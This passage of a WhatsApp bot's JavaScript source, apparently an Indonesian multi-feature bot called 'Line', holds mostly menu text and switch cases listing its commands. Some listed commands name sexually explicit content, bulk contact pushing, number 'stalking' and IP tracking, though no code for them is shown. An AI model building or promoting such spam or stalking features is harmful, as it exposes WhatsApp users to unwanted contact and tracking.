 • 🆕 ${prefix}add
 • ❌ ${prefix}kick
 • 🔗 ${prefix}linkgc
 • 🔄 ${prefix}revoke
 • ⬆️ ${prefix}promote
 • ⬇️ ${prefix}demote
 • 🚪 ${prefix}open
 • 🔒 ${prefix}close
 • ⏰ ${prefix}opentime
 • ⏳ ${prefix}closetime
 • 📝 ${prefix}setsubjek
 • 🖊️ ${prefix}setdesk
 • 🖼️ ${prefix}setppgc
 • ❌ ${prefix}delppgc
 • 🏷️ ${prefix}getnamagc
 • 🗣️ ${prefix}getdeskgc
 • 🖼️ ${prefix}getppgc
 • 🏷️ ${prefix}getname
 • 🖼️ ${prefix}getpp
 • ℹ️ ${prefix}infogc
 • 🌍 ${prefix}topglobal
 • 🌐 ${prefix}toplocal
 • 🚪 ${prefix}leavegc
 • 🗨️ ${prefix}quoted
 • 🔗 ${prefix}antilink
 • 🚫 ${prefix}antilinkgc
 • 🏷️ ${prefix}hidetag
 • 🔖 ${prefix}totag
 • 🗑️ ${prefix}del2
 • 🔇 ${prefix}mute
 • 👤 ${prefix}afk

┏━━━━━━━━━━━━━━━━━━━┓
┃      🎮 ${monospace("GAMES MENU")} 🎮      
┗━━━━━━━━━━━━━━━━━━━┛
 • 🎮 ${prefix}family100
 • ✊ ${prefix}suitpvp
 • ❌ ${prefix}tictactoe
 • 🗑️ ${prefix}delttt
 • 💣 ${prefix}petakbom
 • 🗑️ ${prefix}delpetakbom
 • 🎰 ${prefix}casino
 • 🗑️ ${prefix}delcasino
 • 🐺 ${prefix}werewolf
 • 💃 ${prefix}wikwik
 • 🛵 ${prefix}ngojek
 • 🖼️ ${prefix}tebakgambar
 • 📝 ${prefix}tebakkalimat
 • 🧐 ${prefix}tebakkata
 • 🎶 ${prefix}tebaklirik
 • 🍿 ${prefix}tebakanime
 • 🎵 ${prefix}tebaklagu
 • 🏆 ${prefix}kuis
 • 🧪 ${prefix}tebakkimia
 • 🌍 ${prefix}tebakbendera
 • ❓ ${prefix}siapakahaku
 • 🧠 ${prefix}asahotak
 • 🔤 ${prefix}susukata
 • 🎤 ${prefix}caklontong
 • ➗ ${prefix}math
 • 🎮 ${prefix}tebakgame
 • 💎 ${prefix}slot

┏━━━━━━━━━━━━━━━━━━━┓
┃      🛍️ ${monospace("STORE MENU")} 🛍️      
┗━━━━━━━━━━━━━━━━━━━┛
 • ➕ ${prefix}tambah
 • ➖ ${prefix}kurang
 • ✖️ ${prefix}kali
 • ➗ ${prefix}bagi
 • 🏅 ${prefix}buygold
 • 💳 ${prefix}buysaldo
 • 📱 ${prefix}buy1gb
 • 📱 ${prefix}buy2gb
 • 📱 ${prefix}buy3gb
 • 📱 ${prefix}buy4gb
 • 📱 ${prefix}buy5gb
 • 📝 ${prefix}list
 • ➕ ${prefix}addlist
 • ❌ ${prefix}dellist
 • 🔄 ${prefix}update
 • 💸 ${prefix}addsewa
 • ❌ ${prefix}delsewa
 • 📝 ${prefix}ceksewa
 • 📜 ${prefix}listsewa
 • ➕ ${prefix}addproduk
 • ❌ ${prefix}delproduk
 • 🔄 ${prefix}updateproduk
 • 🛒 ${prefix}listproduk
 • 💸 ${prefix}diskon
 • 🔄 ${prefix}restok
 • 💳 ${prefix}beliproduk
 • ✅ ${prefix}confirm
 • ❌ ${prefix}cancel
 • 📊 ${prefix}thistory

┏━━━━━━━━━━━━━━━━━━━┓
┃      🎭 ${monospace("MENFES MENU")} 🎭      
┗━━━━━━━━━━━━━━━━━━━┛
 • 👤 ${prefix}anonymous
 • 🚀 ${prefix}start
 • 🏁 ${prefix}mulai
 • 🚪 ${prefix}leave
 • ❌ ${prefix}keluar
 • ▶️ ${prefix}next
 • ⏩ ${prefix}lanjut
 • 💌 ${prefix}confess
 • 📝 ${prefix}menfess
 • 💬 ${prefix}balasmenfess
 • 🚫 ${prefix}tolakmenfess
 • 🛑 ${prefix}stopmenfess

┏━━━━━━━━━━━━━━━━━━━┓
┃      ⚙️ ${monospace("CPANEL MENU")} ⚙️      
┗━━━━━━━━━━━━━━━━━━━┛
 • 📜 ${prefix}listserver
 • ❌ ${prefix}delserver
 • 👥 ${prefix}listuser
 • ❌ ${prefix}deluser
 • 🛠️ ${prefix}addadmin
 • ❌ ${prefix}deladmin
 • 📜 ${prefix}listadmin
 • 💾 ${prefix}1gb
 • 💾 ${prefix}2gb
 • 💾 ${prefix}3gb
 • 💾 ${prefix}4gb
 • 💾 ${prefix}5gb
 • 💾 ${prefix}6gb
 • 💾 ${prefix}7gb
 • 💾 ${prefix}8gb
 • 💾 ${prefix}9gb
 • 💾 ${prefix}10gb
 • 🌐 ${prefix}unli
 • 🛠️ ${prefix}claimadmin
 • 🗿 ${prefix}adminpanel
 • 🔒 ${prefix}suspend
 • 🔓 ${prefix}unsuspend
 • 🔄 ${prefix}reinstall
 • ▶️ ${prefix}startsrv
 • ⏹️ ${prefix}stopsrv
 • 🔄 ${prefix}restartsrv

┏━━━━━━━━━━━━━━━━━━━┓
┃      📲 ${monospace("NGEPUSH MENU")} 📲      
┗━━━━━━━━━━━━━━━━━━━┛
 • 📇 ${prefix}pushkontak
 • 📇 ${prefix}pushkontak2
 • 📇 ${prefix}pushkontakid
 • 📇 ${prefix}pushkontakgc
 • 📇 ${prefix}pushkontakidjd
 • 📇 ${prefix}pushkontakgcjd
 • 💾 ${prefix}savecontact
 • 💾 ${prefix}savecontact2
 • 💾 ${prefix}save
 • 📝 ${prefix}cekidgc
 • 📝 ${prefix}listgc

┏━━━━━━━━━━━━━━━━━━━┓
┃      📥 ${monospace("DONLOD MENU")} 📥      
┗━━━━━━━━━━━━━━━━━━━┛
 • 📁 ${prefix}mediafire
 • 🎵 ${prefix}tiktok
 • 📘 ${prefix}facebook
 • 📸 ${prefix}instagram
 • 🐦 ${prefix}twitter
 • 📦 ${prefix}terabox
 • 🎭 ${prefix}ytdl
 • ✂️ ${prefix}capcut
 • ☁️ ${prefix}gdrive
 • 🌐 ${prefix}tinyurl
 • 📂 ${prefix}gitclone
 • 🎮 ${prefix}happymod

┏━━━━━━━━━━━━━━━━━━━┓
┃      🤖 ${monospace("CHATAI MENU")} 🤖      
┗━━━━━━━━━━━━━━━━━━━┛
 • 🤖 ${prefix}Lineai
 • 🤖 ${prefix}ai2
 • 🤖 ${prefix}thomas
 • 🤖 ${prefix}adam
 • 🤖 ${prefix}boy
 • 🤖 ${prefix}simi
 • 🤖 ${prefix}luminai
 • 🤖 ${prefix}min
 • 🤖 ${prefix}gpt
 • 🤖 ${prefix}Line
 • 🤖 ${prefix}bochi
 • 🤖 ${prefix}lora
 • 🤖 ${prefix}bowo
 • 🤖 ${prefix}gemini
 • 🤖 ${prefix}bingai
 • 🤖 ${prefix}chatgpt1
 • 🤖 ${prefix}chatgpt2
 • 🤖 ${prefix}gpt4
 • 🤖 ${prefix}gpt2

┏━━━━━━━━━━━━━━━━━━━┓
┃      🔍 ${monospace("SEARCH MENU")} 🔍      
┗━━━━━━━━━━━━━━━━━━━┛
 • 🌍 ${prefix}google
 • 🖼️ ${prefix}gimage
 • 🎥 ${prefix}ytsearch
 • 🎶 ${prefix}play
 • 🎬 ${prefix}video
 • 🎧 ${prefix}audio
 • 📹 ${prefix}ytmp4
 • 🎵 ${prefix}ytmp3
 • 🎥 ${prefix}ttsearch
 • 🎥 ${prefix}ttget
 • 🎵 ${prefix}spotifys
 • 📍 ${prefix}pin
 • 📰 ${prefix}news
 • 📚 ${prefix}wiki

┏━━━━━━━━━━━━━━━━━━━┓
┃      🔧 ${monospace("PTERO MENU")} 🔧      
┗━━━━━━━━━━━━━━━━━━━┛
 • ⚙️ ${prefix}createnode
 • 📥 ${prefix}installpanel
 • ❌ ${prefix}uninstallpanel
 • ▶️ ${prefix}startwings
 • 🔸 ${prefix}itema1
 • 🔸 ${prefix}itema2
 • 🔸 ${prefix}itema3

┏━━━━━━━━━━━━━━━━━━━┓
┃      🔞 ${monospace("NSFW MENU")} 🔞      
┗━━━━━━━━━━━━━━━━━━━┛
 • 🔞 ${prefix}nsfw
 • 👘 ${prefix}waifu
 • 🐾 ${prefix}neko
 • 💢 ${prefix}shinobu
 • ⚡ ${prefix}megumin
 • 🥊 ${prefix}bully
 • 🤗 ${prefix}cuddle
 • 😢 ${prefix}cry
 • 🤗 ${prefix}hug
 • 🐾 ${prefix}awoo
 • 💋 ${prefix}kiss
 • 👅 ${prefix}lick
 • 👋 ${prefix}pat
 • 😏 ${prefix}smug
 • 🥋 ${prefix}bonk
 • 💨 ${prefix}yeet
 • 😊 ${prefix}blush
 • 😄 ${prefix}smile
 • 👋 ${prefix}wave
 • ✋ ${prefix}highfive
 • ✋ ${prefix}handhold
 • 🍽️ ${prefix}nom
 • 🦷 ${prefix}bite
 • 💥 ${prefix}glomp
 • 🤚 ${prefix}slap
 • 💀 ${prefix}kill
 • 🦵 ${prefix}kick
 • 😊 ${prefix}happy
 • 😉 ${prefix}wink
 • 👆 ${prefix}poke
 • 💃 ${prefix}dance
 • 🥲 ${prefix}cringe
 • ⚔️ ${prefix}trap
 • 🍆 ${prefix}blowjob
 • 🍑 ${prefix}hentai
 • 🍒 ${prefix}boobs
 • 🍑 ${prefix}ass
 • 💋 ${prefix}pussy
 • 🍑 ${prefix}thighs
 • 👩‍❤️‍💋‍👩 ${prefix}lesbian
 • 🐾 ${prefix}lewdneko
 • 💦 ${prefix}cum

┏━━━━━━━━━━━━━━━━━━━┓
┃      🎨 ${monospace("EPHOTO MENU")} 🎨      
┗━━━━━━━━━━━━━━━━━━━┛
 • 🖌️ ${prefix}glitchtext
 • ✍️ ${prefix}writetext
 • 🌟 ${prefix}advancedglow
 • 🔤 ${prefix}typographytext
 • 🌈 ${prefix}pixelglitch
 • 🌐 ${prefix}neonglitch
 • 🇫🇷 ${prefix}flagtext
 • 🇺🇳 ${prefix}flag3dtext
 • 🗑️ ${prefix}deletingtext
 • 🌸 ${prefix}blackpinkstyle
 • 🌟 ${prefix}glowingtext
 • 🌊 ${prefix}underwatertext
 • 🖼️ ${prefix}logomaker
 • 🎨 ${prefix}cartoonstyle
 • 📝 ${prefix}papercutstyle
 • 🌻 ${prefix}watercolortext
 • ☁️ ${prefix}effectclouds
 • 🖤 ${prefix}blackpinklogo
 • 🌈 ${prefix}gradienttext 
 • 🏖️ ${prefix}summerbeach
 • 👑 ${prefix}luxurygold
 • 🌈 ${prefix}multicoloredneon
 • 🏖️ ${prefix}sandsummer
 • 🌌 ${prefix}galaxywallpaper
 • 🎥 ${prefix}1917style
 • 🌟 ${prefix}makingneon
 • 👑 ${prefix}royaltext
 • 🔧 ${prefix}freecreate
 • 🌌 ${prefix}galaxystyle
 • 💡 ${prefix}lighteffects

┏━━━━━━━━━━━━━━━━━━━┓
┃      👩‍🎤 ${monospace("CECAN MENU")} 👩‍🎤      
┗━━━━━━━━━━━━━━━━━━━┛
 • 👩‍🦰 ${prefix}hijaber
 • 👩‍🦱 ${prefix}jeni
 • 👩‍🦳 ${prefix}jiso
 • 👩‍🦴 ${prefix}justina
 • 🌹 ${prefix}rose
 • 🦸‍♀️ ${prefix}ryujin
 • 🇻🇳 ${prefix}vietnam
 • 🇰🇷 ${prefix}korea
 • 🇮🇩 ${prefix}indonesian
 • 🇯🇵 ${prefix}japan
 • 🇹🇭 ${prefix}thailand
 • 🇨🇳 ${prefix}china

┏━━━━━━━━━━━━━━━━━━━┓
┃      🎤 ${monospace("COGAN MENU")} 🎤      
┗━━━━━━━━━━━━━━━━━━━┛
 • 🧑‍🎤 ${prefix}wuyifan
 • 🎤 ${prefix}suga
 • 🎤 ${prefix}parkchanyeol
 • 🎤 ${prefix}ohsehun
 • 🎤 ${prefix}luhan
 • 🎤 ${prefix}kimtaehyung
 • 🎤 ${prefix}kimsoek
 • 🎤 ${prefix}kimnanjoon
 • 🎤 ${prefix}kimminseok
 • 🎤 ${prefix}kimjunmyeon
 • 🎤 ${prefix}kimjong
 • 🎤 ${prefix}kimjondae
 • 🎤 ${prefix}jungkook
 • 🎤 ${prefix}jimin
 • 🎤 ${prefix}jhope
 • 🎤 ${prefix}huangzitao
 • 🎤 ${prefix}dohkyungsoo
 • 🎤 ${prefix}baekhyung

┏━━━━━━━━━━━━━━━━━━━┓
┃      🛠️ ${monospace("TOOLS MENU")} 🛠️      
┗━━━━━━━━━━━━━━━━━━━┛
 • 🔢 ${prefix}tobase64
 • ⬆️ ${prefix}toori
 • 🔒 ${prefix}enc
 • 🔒 ${prefix}enc2
 • 🔓 ${prefix}noenc
 • 📂 ${prefix}toraw
 • 🧠 ${prefix}togh
 • 🖋️ ${prefix}nuliskanan
 • 🖋️ ${prefix}nuliskiri
 • 📝 ${prefix}foliokanan
 • 📝 ${prefix}foliokiri
 • 💄 ${prefix}beauty
 • 🌐 ${prefix}flatten
 • 📝 ${prefix}addwm
 • 📗 ${prefix}dnslookup
 • 🔐 ${prefix}proxy
 • 🔗 ${prefix}trackip
 • 🎭 ${prefix}wastalk
 • 📊 ${prefix}cfps
 • ⏰ ${prefix}setspeed
 • 🎞 ${prefix}totxt
 • ☁ ${prefix}expireddomain
 • 📋 ${prefix}cariresep
 • 📽 ${prefix}hdvid
 
┏━━━━━━━━━━━━━━━━━━━┓
┃      📜 ${monospace("VOICE MENU")} 📜      
┗━━━━━━━━━━━━━━━━━━━┛
 • 📝 ${prefix}bass 
 • ❌ ${prefix}blown 
 • ✨ ${prefix}deep 
 • 📜 ${prefix}earrape 
 • 🔢 ${prefix}fast 
 • 📋 ${prefix}fat 
 • 🤖 ${prefix}nightcore 
 • 📺 ${prefix}reverse 
 • 💻 ${prefix}robot 
 • 🌟 ${prefix}slow 
 • 🪙 ${prefix}smooth 
 • 💰 ${prefix}tupai 
 • 🎟️ ${prefix}echo 
 • 📊 ${prefix}flanger 
 • 💸 ${prefix}vaporwave 
 • 📉 ${prefix}treble 
 • 🔄 ${prefix}vibrato 
 • 👤 ${prefix}distortion 
 • 📶 ${prefix}karaoke 
 • ⏱️ ${prefix}chipmunk 

┏━━━━━━━━━━━━━━━━━━━┓
┃      🕌 ${monospace("ISLAMIC MENU")} 🕌      
┗━━━━━━━━━━━━━━━━━━━┛
 • 🌄 ${prefix}jadwalsholat
 • 🌺 ${prefix}asmaulhusna
 • 🕋 ${prefix}niatsholat
 • 📖 ${prefix}surah
 • 🙏 ${prefix}berdoa
 • 🌙 ${prefix}gislam
 • 📜 ${prefix}kataislam
 • 🖋️ ${prefix}pantunislam
 
┏━━━━━━━━━━━━━━━━━━━┓
┃      🤣 ${monospace("FUN MENU")} 🤣      
┗━━━━━━━━━━━━━━━━━━━┛
 • 🎲 ${prefix}apakah
 • 🎯 ${prefix}bisakah
 • ⏳ ${prefix}kapankah
 • 😎 ${prefix}cekganteng
 • 🌺 ${prefix}cekcantik
 
┏━━━━━━━━━━━━━━━━━━━┓
┃      📜 ${monospace("OTHERS MENU")} 📜      
┗━━━━━━━━━━━━━━━━━━━┛
 • 📝 ${prefix}jadibot 
 • ❌ ${prefix}stopjadibot 
 • ✨ ${prefix}listjadibot 
 • 📜 ${prefix}ceknickff 
 • 📋 ${prefix}ceknickml 
 • 🤖 ${prefix}hdimg 
 • 📺 ${prefix}recolor 
 • 💻 ${prefix}dehaze 
 • 🌟 ${prefix}hdvid 
 • 🪙 ${prefix}tourl 
 • 💰 ${prefix}ssweb 
 • 🎟️ ${prefix}nobg 
 • 📊 ${prefix}resize 
 • 💸 ${prefix}qcstik 
 • 📉 ${prefix}qckode 
 • 🔄 ${prefix}stiker 
 • 👤 ${prefix}smeme 
 • 📶 ${prefix}swm 
 • ⏱️ ${prefix}gtts 
 • 💳 ${prefix}readvo 
 • 🛠️ ${prefix}getvideo 
 • 📩 ${prefix}getmusic 
 • 📲 ${prefix}cekkhodam 
 • 📝 ${prefix}toimg 
 • 🗑️ ${prefix}tomp3 
 • 🧐 ${prefix}tovn 
 • 📝 ${prefix}translate 
 • 🧐 ${prefix}listbahasa 
 • ❌ ${prefix}toanime 
 • 🛠️ ${prefix}toreal 
 • 📩 ${prefix}ytkomen 
 • 📝 ${prefix}carbon
 
Line-v${version} Official Version`
listbut(m.chat, dede, m)
}

break

case 'mainmenu':
case 'mainmenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("MAIN  MENU")}
 • ${prefix}regis
 • ${prefix}unregis
 • ${prefix}nickname
 • ${prefix}setmenu
 • ${prefix}setallmenu
 • ${prefix}prefix
 • ${prefix}infome
 • ${prefix}infobot
 • ${prefix}channel
 • ${prefix}script
 • ${prefix}credit
 • ${prefix}qris
 • ${prefix}gold
 • ${prefix}saldo
 • ${prefix}limit
 • ${prefix}cekgold
 • ${prefix}ceksaldo
 • ${prefix}ceklimit
 • ${prefix}tfsaldo
 • ${prefix}owner
 • ${prefix}ping
 • ${prefix}runtime
 • ${prefix}payment
 • ${prefix}totalfitur
 • ${prefix}report
 • ${prefix}reply
 • ${prefix}reports
 • ${prefix}delreports
 • ${prefix}cekreports
 • ${prefix}del
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'ownermenu':
case 'ownermenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("OWNER  MENU")}
 • ${prefix}addcase
 • ${prefix}delcase
 • ${prefix}getcase
 • ${prefix}cekcase
 • ${prefix}listcase
 • ${prefix}addfunc
 • ${prefix}delfunc
 • ${prefix}getfunc
 • ${prefix}cekfunc
 • ${prefix}addlet
 • ${prefix}dellet
 • ${prefix}getlet
 • ${prefix}addconst
 • ${prefix}getdep
 • ${prefix}gantifile
 • ${prefix}sendfitur
 • ${prefix}backup
 • ${prefix}getsession
 • ${prefix}delsession
 • ${prefix}ambilsc
 • ${prefix}sendsc
 • ${prefix}addres
 • ${prefix}delres
 • ${prefix}listres
 • ${prefix}addprem
 • ${prefix}delprem
 • ${prefix}listprem
 • ${prefix}addowner
 • ${prefix}delowner
 • ${prefix}listowner
 • ${prefix}addgold
 • ${prefix}mingold
 • ${prefix}addsaldo
 • ${prefix}minsaldo
 • ${prefix}addlimit
 • ${prefix}minlimit
 • ${prefix}sampah
 • ${prefix}delsampah
 • ${prefix}delsampah2
 • ${prefix}clearsesi
 • ${prefix}getdb
 • ${prefix}getfolder
 • ${prefix}getfile
 • ${prefix}getfile2
 • ${prefix}addfolder
 • ${prefix}addfile
 • ${prefix}delfolder
 • ${prefix}delfile
 • ${prefix}bcgc
 • ${prefix}bcimg
 • ${prefix}bcvid
 • ${prefix}bcsl
 • ${prefix}adduserdb
 • ${prefix}deluserdb
 • ${prefix}block
 • ${prefix}unblock
 • ${prefix}listblock
 • ${prefix}public
 • ${prefix}self
 • ${prefix}restart
 • ${prefix}join
 • ${prefix}setnamabot
 • ${prefix}setbiobot
 • ${prefix}setppbot
 • ${prefix}delppbot
 • ${prefix}autotyping
 • ${prefix}autoread
 • ${prefix}autobio
 • ${prefix}anticall
 • ${prefix}antispam
 • ${prefix}antibot
 • ${prefix}ban
 • ${prefix}unban
 • ${prefix}listban
 • ${prefix}creategc
 • ${prefix}addexc
 • ${prefix}delexc
 • ${prefix}listexc
 • ${prefix}read
 • ${prefix}gh
 • ${prefix}gconly
 • ${prefix}pconly
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'grupmenu':
case 'grupmenu-v':
case 'groupmenu':
case 'groupmenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("GROUP  MENU")}
 • ${prefix}add
 • ${prefix}kick
 • ${prefix}linkgc
 • ${prefix}revoke
 • ${prefix}promote
 • ${prefix}demote
 • ${prefix}open
 • ${prefix}close
 • ${prefix}opentime
 • ${prefix}closetime
 • ${prefix}setsubjek
 • ${prefix}setdesk
 • ${prefix}setppgc
 • ${prefix}delppgc
 • ${prefix}getnamagc
 • ${prefix}getdeskgc
 • ${prefix}getppgc
 • ${prefix}getname
 • ${prefix}getpp
 • ${prefix}infogc
 • ${prefix}topglobal
 • ${prefix}toplocal
 • ${prefix}leavegc
 • ${prefix}quoted
 • ${prefix}antilink
 • ${prefix}antilinkgc
 • ${prefix}hidetag
 • ${prefix}totag
 • ${prefix}del2
 • ${prefix}mute
 • ${prefix}afk
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'gamemenu':
case 'gamemenu-v':
case 'gamesmenu':
case 'gamesmenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("GAMES  MENU")}
 • ${prefix}family100
 • ${prefix}suitpvp
 • ${prefix}tictactoe
 • ${prefix}delttt
 • ${prefix}petakbom
 • ${prefix}delpetakbom
 • ${prefix}casino
 • ${prefix}delcasino
 • ${prefix}werewolf
 • ${prefix}wikwik
 • ${prefix}ngojek
 • ${prefix}tebakgambar
 • ${prefix}tebakkalimat
 • ${prefix}tebakkata
 • ${prefix}tebaklirik
 • ${prefix}tebakanime
 • ${prefix}tebaklagu
 • ${prefix}kuis
 • ${prefix}tebakkimia
 • ${prefix}tebakbendera
 • ${prefix}siapakahaku
 • ${prefix}asahotak
 • ${prefix}susukata
 • ${prefix}caklontong
 • ${prefix}math
 • ${prefix}tebakgame
 • ${prefix}slot
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'storemenu':
case 'storemenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("STORE  MENU")}
 • ${prefix}tambah
 • ${prefix}kurang
 • ${prefix}kali
 • ${prefix}bagi
 • ${prefix}buygold
 • ${prefix}buysaldo
 • ${prefix}buy1gb
 • ${prefix}buy2gb
 • ${prefix}buy3gb
 • ${prefix}buy4gb
 • ${prefix}buy5gb
 • ${prefix}list
 • ${prefix}addlist
 • ${prefix}dellist
 • ${prefix}update
 • ${prefix}addsewa
 • ${prefix}delsewa
 • ${prefix}ceksewa
 • ${prefix}listsewa
 • ${prefix}addproduk
 • ${prefix}delproduk
 • ${prefix}updateproduk
 • ${prefix}listproduk
 • ${prefix}diskon
 • ${prefix}restok
 • ${prefix}beliproduk
 • ${prefix}confirm
 • ${prefix}cancel
 • ${prefix}thistory
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'confesmenu':
case 'confesmenu-v':
case 'menfesmenu':
case 'menfesmenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("MENFES  MENU")}
 • ${prefix}anonymous
 • ${prefix}start
 • ${prefix}mulai
 • ${prefix}leave
 • ${prefix}keluar
 • ${prefix}next
 • ${prefix}lanjut
 • ${prefix}confess
 • ${prefix}menfess
 • ${prefix}balasmenfess
 • ${prefix}tolakmenfess
 • ${prefix}stopmenfess
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'cpanelmenu':
case 'cpanelmenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("CPANEL  MENU")}
 • ${prefix}listserver
 • ${prefix}delserver
 • ${prefix}listuser
 • ${prefix}deluser
 • ${prefix}addadmin
 • ${prefix}deladmin
 • ${prefix}listadmin
 • ${prefix}1gb
 • ${prefix}2gb
 • ${prefix}3gb
 • ${prefix}4gb
 • ${prefix}5gb
 • ${prefix}6gb
 • ${prefix}7gb
 • ${prefix}8gb
 • ${prefix}9gb
 • ${prefix}10gb
 • ${prefix}unli
 • ${prefix}suspend
 • ${prefix}unsuspend
 • ${prefix}reinstall
 • ${prefix}startsrv
 • ${prefix}stopsrv
 • ${prefix}restartsrv
 • ${prefix}jadiadp
 • ${prefix}bukanadp
 • ${prefix}ubahemail
 • ${prefix}ubahpassword
 • ${prefix}ubahusername
 • ${prefix}ubahfirstname
 • ${prefix}ubahlastname
 • ${prefix}ubahdatauser1
 • ${prefix}ubahdatauser2
 • ${prefix}ubahdatauser3
 • ${prefix}ubahserver
 • ${prefix}ubahram
 • ${prefix}ubahcpu
 • ${prefix}ubahdisk
 • ${prefix}addemail
 • ${prefix}deletemail
 • ${prefix}listemail
 • ${prefix}antiadminilegal
 • ${prefix}cekakunpanel
 • ${prefix}susallsrv
 • ${prefix}reinstallsrv
 • ${prefix}detailsrv
 • ${prefix}delallsrv
 • ${prefix}createalllocation
  
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'pushmenu':
case 'pushmenu-v':
case 'ngepushmenu':
case 'ngepushmenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("NGEPUSH  MENU")}
 • ${prefix}pushkontak
 • ${prefix}pushkontak2
 • ${prefix}pushkontakid
 • ${prefix}pushkontakgc
 • ${prefix}pushkontakidjd
 • ${prefix}pushkontakgcjd
 • ${prefix}savecontact
 • ${prefix}savecontact2
 • ${prefix}save
 • ${prefix}cekidgc
 • ${prefix}listgc
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'donlodmenu':
case 'donlodmenu-v':
case 'downloadmenu':
case 'downloadmenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("DONLOD  MENU")}
 • ${prefix}mediafire
 • ${prefix}tiktok
 • ${prefix}facebook
 • ${prefix}instagram
 • ${prefix}terabox
 • ${prefix}ytdl
 • ${prefix}twitter
 • ${prefix}capcut
 • ${prefix}gdrive
 • ${prefix}tinyurl
 • ${prefix}gitclone
 • ${prefix}happymod
 • ${prefix}pindl
 • ${prefix}xnxxdl
 • ${prefix}pastebin
 • ${prefix}xvideodl
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'saweriamenu': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("SAWERIA  MENU")}
 • ${prefix}deposit
 • ${prefix}batalbeli
 • ${prefix}buyproduk
 • ${prefix}buyreseller
 • ${prefix}buypanel
 • ${prefix}buysc
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'orkutmenu': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("ORKUT  MENU")}
 • ${prefix}buypanelo
 • ${prefix}buyproduko
 • ${prefix}buyvps
 • ${prefix}deposito
 • ${prefix}cekmutasi
 • ${prefix}ceksaldo
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'linodemenu':
case 'linodemenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("LINODE  MENU")}
 • ${prefix}linode2gb
 • ${prefix}linode4gb
 • ${prefix}linode8gb
 • ${prefix}linode16gb
 • ${prefix}listlinode
 • ${prefix}onlinode
 • ${prefix}offlinode
 • ${prefix}rebootlinode
 • ${prefix}rebuildlinode
 • ${prefix}delinode
 • ${prefix}saldolinode
 • ${prefix}sisalinode
 • ${prefix}cekvpslinode
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'domenu':
case 'domenu-v':
case 'digitalocean':
case 'digitalocean-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("DIGITAL  OCEAN")}
 • ${prefix}vps-1gb
 • ${prefix}vps-2gb1
 • ${prefix}vps-2gb2
 • ${prefix}vps-4gb
 • ${prefix}vps-8gb
 • ${prefix}vps-16gb
 • ${prefix}listdroplet
 • ${prefix}deldroplet
 • ${prefix}sisadroplet
 • ${prefix}cekdroplet
 • ${prefix}turnon
 • ${prefix}turnoff
 • ${prefix}restartvps
 
Line-v${version} Official Version`
Line.sendOrder(m.chat, teks, fs.readFileSync('./lib/thumbnail/thumbnail.jpg'), "10", 30000000, ftoko)
}
break

case 'aimenu':
case 'aimenu-v':
case 'chataimenu':
case 'chataimenu-v': {
vreact()
let teks = `${ucapanWaktu} ${db.data.users[m.sender].nama} 👋

乂 ${monospace("CHATAI  MENU")}
 • ${prefix}Lineai
 • ${prefix}ai2
 • ${prefix}thomas
 • ${prefix}adam
 • ${prefix}boy
 • ${prefix}simi
 • ${prefix}luminai
 • ${prefix}min
 • ${prefix}gpt
 • ${prefix}Line
 • ${prefix}bochi
 • ${prefix}lora
 • ${prefix}bowo
 • ${prefix}dimas
 • ${prefix}jajang
 • ${prefix}siti
 • ${prefix}tuti
 • ${prefix}aisrc
 • ${prefix}aisrc2
 • ${prefix}liya
 • ${prefix}dalle
 • ${prefix}chatgpt
 • ${prefix}gemini
 • ${prefix}bingai
 • ${prefix}chatgpt1
 • ${prefix}chatgpt2
 • ${prefix}gpt4
 • ${prefix}gpt2
